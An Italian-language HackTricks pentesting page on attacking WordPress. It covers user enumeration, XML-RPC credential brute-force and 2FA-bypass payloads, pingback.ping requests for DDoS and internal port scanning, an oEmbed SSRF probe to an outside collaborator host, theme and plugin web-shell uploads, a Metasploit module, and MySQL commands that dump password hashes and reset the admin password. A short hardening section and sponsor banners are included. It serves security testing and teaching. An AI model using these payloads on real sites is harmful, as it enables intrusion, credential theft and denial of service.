# Wordpress

<details>

<summary><strong>Impara l'hacking AWS da zero a ero con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) per costruire facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti comunitari **pi√π avanzati** al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Informazioni di Base

I file **caricati** vanno a: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
I file dei **temi possono essere trovati in /wp-content/themes/**, quindi se modifichi qualche php del tema per ottenere RCE probabilmente userai quel percorso. Ad esempio: Utilizzando il **tema twentytwelve** puoi **accedere** al file **404.php** in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**Un'altra URL utile potrebbe essere:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

In **wp-config.php** puoi trovare la password di root del database.

Percorsi di accesso predefiniti da controllare: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **File Principali di WordPress**

* `index.php`
* `license.txt` contiene informazioni utili come la versione di WordPress installata.
* `wp-activate.php` √® utilizzato per il processo di attivazione via email durante la configurazione di un nuovo sito WordPress.
* Cartelle di accesso (possono essere rinominate per nasconderle):
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` √® un file che rappresenta una funzionalit√† di WordPress che consente di trasmettere dati con HTTP agendo come meccanismo di trasporto e XML come meccanismo di codifica. Questo tipo di comunicazione √® stato sostituito dall'[API REST](https://developer.wordpress.org/rest-api/reference) di WordPress.
* La cartella `wp-content` √® la directory principale dove vengono memorizzati i plugin e i temi.
* `wp-content/uploads/` √à la directory dove vengono memorizzati i file caricati sulla piattaforma.
* `wp-includes/` Questa √® la directory dove sono memorizzati i file core, come certificati, font, file JavaScript e widget.
* `wp-sitemap.xml` Nelle versioni di Wordpress 5.5 e successive, Wordpress genera un file XML della mappa del sito con tutti i post pubblici e i tipi di post e tassonomie pubblicamente interrogabili.

**Post exploitation**

* Il file `wp-config.php` contiene le informazioni necessarie a WordPress per connettersi al database come il nome del database, l'host del database, nome utente e password, chiavi di autenticazione e sale, e il prefisso della tabella del database. Questo file di configurazione pu√≤ anche essere utilizzato per attivare la modalit√† DEBUG, che pu√≤ essere utile per il troubleshooting.

### Permessi Utenti

* **Amministratore**
* **Editore**: Pubblica e gestisce i suoi e gli altri post
* **Autore**: Pubblica e gestisce i propri post
* **Contributore**: Scrive e gestisce i suoi post ma non pu√≤ pubblicarli
* **Sottoscrittore**: Sfoglia i post e modifica il proprio profilo

## **Enumerazione Passiva**

### **Ottenere la versione di WordPress**

Controlla se riesci a trovare i file `/license.txt` o `/readme.html`

All'interno del **codice sorgente** della pagina (esempio da [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (1111).png>)

* File di collegamento CSS

![](<../../.gitbook/assets/image (533).png>)

* File JavaScript

![](<../../.gitbook/assets/image (524).png>)

### Ottenere Plugin

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
{% endcode %}

### Ottenere Temi

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Estrarre versioni in generale

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) per costruire facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti comunitari **pi√π avanzati al mondo**.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Enumerazione attiva

### Plugin e Temi

Probabilmente non sarai in grado di trovare tutti i Plugin e Temi possibili. Per scoprirli tutti, dovrai **forzare attivamente un elenco di Plugin e Temi** (per fortuna ci sono strumenti automatizzati che contengono questi elenchi).

### Utenti

**ID Brute**

Puoi ottenere utenti validi da un sito WordPress forzando gli ID degli utenti:
```
curl -s -I -X GET http://blog.example.com/?author=1
```
Se le risposte sono **200** o **30X**, significa che l'id √® **valido**. Se la risposta √® **400**, allora l'id √® **invalido**.

**wp-json**

Puoi anche provare a ottenere informazioni sugli utenti effettuando una query:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
Un altro endpoint `/wp-json/` che pu√≤ rivelare informazioni sugli utenti √®:
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Nota che questo endpoint espone solo gli utenti che hanno pubblicato un post. **Saranno fornite informazioni solo sugli utenti che hanno questa funzionalit√† abilitata**.

Inoltre, nota che **/wp-json/wp/v2/pages** potrebbe rivelare gli indirizzi IP.

#### Enumerazione dei nomi utente per il login

Quando si accede a **`/wp-login.php`** il **messaggio** √® **diverso** se il **nome utente indicato esiste o meno**.

### XML-RPC

Se `xml-rpc.php` √® attivo, √® possibile eseguire un attacco di forza bruta alle credenziali o usarlo per lanciare attacchi DoS ad altre risorse. (√à possibile automatizzare questo processo [usando questo](https://github.com/relarizky/wpxploit) ad esempio).

Per verificare se √® attivo, prova ad accedere a _**/xmlrpc.php**_ e invia questa richiesta:

**Check**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce delle credenziali**

**`wp.getUserBlogs`**, **`wp.getCategories`** o **`metaWeblog.getUsersBlogs`** sono alcuni dei metodi che possono essere utilizzati per forzare le credenziali. Se riesci a trovarne uno qualsiasi, puoi inviare qualcosa del genere:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Il messaggio _"Nome utente o password non corretti"_ all'interno di una risposta codice 200 dovrebbe apparire se le credenziali non sono valide.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../.gitbook/assets/image (721).png>)

Utilizzando le credenziali corrette √® possibile caricare un file. Nella risposta apparir√† il percorso ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Anche c'√® un **modo pi√π veloce** per forzare le credenziali usando **`system.multicall`** poich√© √® possibile provare diverse credenziali nella stessa richiesta:

<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Questo metodo √® pensato per i programmi e non per gli esseri umani, ed √® obsoleto, quindi non supporta il 2FA. Quindi, se hai credenziali valide ma l'ingresso principale √® protetto dal 2FA, **potresti riuscire ad abusare di xmlrpc.php per effettuare il login con quelle credenziali eludendo il 2FA**. Nota che non sarai in grado di eseguire tutte le azioni che puoi fare tramite la console, ma potresti comunque riuscire ad ottenere l'RCE come spiega Ippsec in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)

**DDoS o scansione delle porte**

Se riesci a trovare il metodo _**pingback.ping**_ nell'elenco, puoi fare in modo che Wordpress invii una richiesta arbitraria a qualsiasi host/porta.\
Questo pu√≤ essere utilizzato per chiedere a **migliaia** di **siti** Wordpress di **accedere** a una **posizione** specifica (causando cos√¨ un **DDoS** in quella posizione) oppure puoi usarlo per fare in modo che **Wordpress** **scansioni** una rete interna (puoi indicare qualsiasi porta).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se ottieni **faultCode** con un valore **maggiore** di **0** (17), significa che la porta √® aperta.

Dai un'occhiata all'uso di **`system.multicall`** nella sezione precedente per imparare come abusare di questo metodo per causare un DDoS.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (110).png>)

### wp-cron.php DoS

Questo file di solito esiste sotto la radice del sito Wordpress: **`/wp-cron.php`**\
Quando questo file viene **accesso** viene eseguita una **query** MySQL "**pesante**, quindi potrebbe essere utilizzato dagli **attaccanti** per **causare** un **DoS**.\
Inoltre, per impostazione predefinita, `wp-cron.php` viene chiamato ad ogni caricamento della pagina (ogni volta che un client richiede una qualsiasi pagina Wordpress), il che su siti ad alto traffico pu√≤ causare problemi (DoS).

Si consiglia di disabilitare Wp-Cron e creare un vero cronjob all'interno dell'host che esegua le azioni necessarie a intervalli regolari (senza causare problemi).

### /wp-json/oembed/1.0/proxy - SSRF

Prova ad accedere a _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e il sito Worpress potrebbe inviarti una richiesta.

Questa √® la risposta quando non funziona:

![](<../../.gitbook/assets/image (365).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

Questo strumento controlla se il **methodName: pingback.ping** e per il percorso **/wp-json/oembed/1.0/proxy** e se esistono, cerca di sfruttarli.

### Strumenti Automatici
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) per creare facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti comunitari pi√π avanzati al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Ottieni l'accesso sovrascrivendo un bit

Pi√π che un vero attacco, questa √® una curiosit√†. Nel CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) potevi invertire 1 bit da qualsiasi file di Wordpress. Quindi potevi invertire la posizione `5389` del file `/var/www/html/wp-includes/user.php` per annullare l'operazione NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifica di un file php dal tema utilizzato (sono necessarie le credenziali dell'amministratore)**

Aspetto ‚Üí Editor del tema ‚Üí Modello 404 (a destra)

Modificare il contenuto per un php shell:

![](<../../.gitbook/assets/image (384).png>)

Cerca su internet come puoi accedere a quella pagina aggiornata. In questo caso devi accedere qui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Puoi usare:
```
use exploit/unix/webapp/wp_admin_shell_upload
```
per ottenere una sessione.

## Plugin RCE

### Plugin PHP

Potrebbe essere possibile caricare file .php come plugin.\
Crea il tuo backdoor php utilizzando ad esempio:

![](<../../.gitbook/assets/image (183).png>)

Quindi aggiungi un nuovo plugin:

![](<../../.gitbook/assets/image (722).png>)

Carica il plugin e premi Installa ora:

![](<../../.gitbook/assets/image (249).png>)

Clicca su Procedi:

![](<../../.gitbook/assets/image (70).png>)

Probabilmente questo non far√† nulla apparentemente, ma se vai su Media, vedrai il tuo shell caricato:

![](<../../.gitbook/assets/image (462).png>)

Accedici e vedrai l'URL per eseguire il reverse shell:

![](<../../.gitbook/assets/image (1006).png>)

### Caricamento e attivazione di plugin dannosi

Questo metodo coinvolge l'installazione di un plugin dannoso noto per essere vulnerabile e che pu√≤ essere sfruttato per ottenere una web shell. Questo processo viene eseguito attraverso il dashboard di WordPress nel seguente modo:

1. **Acquisizione del Plugin**: Il plugin viene ottenuto da una fonte come Exploit DB come [**qui**](https://www.exploit-db.com/exploits/36374).
2. **Installazione del Plugin**:
* Vai al dashboard di WordPress, quindi vai su `Dashboard > Plugin > Carica Plugin`.
* Carica il file zip del plugin scaricato.
3. **Attivazione del Plugin**: Una volta che il plugin √® stato installato con successo, deve essere attivato attraverso il dashboard.
4. **Sfruttamento**:
* Con il plugin "reflex-gallery" installato e attivato, pu√≤ essere sfruttato poich√© √® noto per essere vulnerabile.
* Il framework Metasploit fornisce uno sfruttamento per questa vulnerabilit√†. Caricando il modulo appropriato ed eseguendo comandi specifici, pu√≤ essere stabilita una sessione meterpreter, concedendo l'accesso non autorizzato al sito.
* Si nota che questo √® solo uno dei molti metodi per sfruttare un sito WordPress.

Il contenuto include aiuti visivi che rappresentano i passaggi nel dashboard di WordPress per l'installazione e l'attivazione del plugin. Tuttavia, √® importante notare che sfruttare le vulnerabilit√† in questo modo √® illegale ed anti-etico senza l'autorizzazione adeguata. Queste informazioni dovrebbero essere utilizzate in modo responsabile e solo in un contesto legale, come il penetration testing con autorizzazione esplicita.

**Per passaggi pi√π dettagliati controlla:** [**https://www.hackingarticles.in/wordpress-reverse-shell/\*\***](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Post Esploitation

Estrai nomi utente e password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Cambia la password dell'amministratore:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Protezione di WordPress

### Aggiornamenti Regolari

Assicurati che WordPress, i plugin e i temi siano aggiornati. Conferma inoltre che l'aggiornamento automatico sia abilitato in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Inoltre, **installa solo plugin e temi WordPress affidabili**.

### Plugin di Sicurezza

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Altre Raccomandazioni**

* Rimuovi l'utente **admin** predefinito
* Utilizza **password sicure** e **2FA**
* Rivedi periodicamente i **permessi** degli utenti
* **Limita i tentativi di accesso** per prevenire attacchi di Forza Bruta
* Rinomina il file **`wp-admin.php`** e permetti l'accesso solo internamente o da determinati indirizzi IP.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) per creare e **automatizzare flussi di lavoro** con gli strumenti comunitari pi√π avanzati al mondo.\
Ottieni l'Accesso Oggi:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
